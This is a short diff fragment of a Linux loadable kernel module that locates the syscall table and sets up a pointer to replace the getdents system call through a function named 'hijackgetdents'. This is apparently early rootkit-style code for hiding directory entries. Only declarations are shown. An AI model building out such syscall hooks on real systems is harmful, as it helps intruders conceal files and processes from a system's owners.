@@ -11,10 +11,10 @@ MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
 MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
-
+#define sys_getdents __NR_getdents
 unsigned long* syscall_table;
 
-static void *originalGetDents = NULL;
+asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp , unsigned int count);
 
 static asmlinkage long* hijackgetdents(void){
 
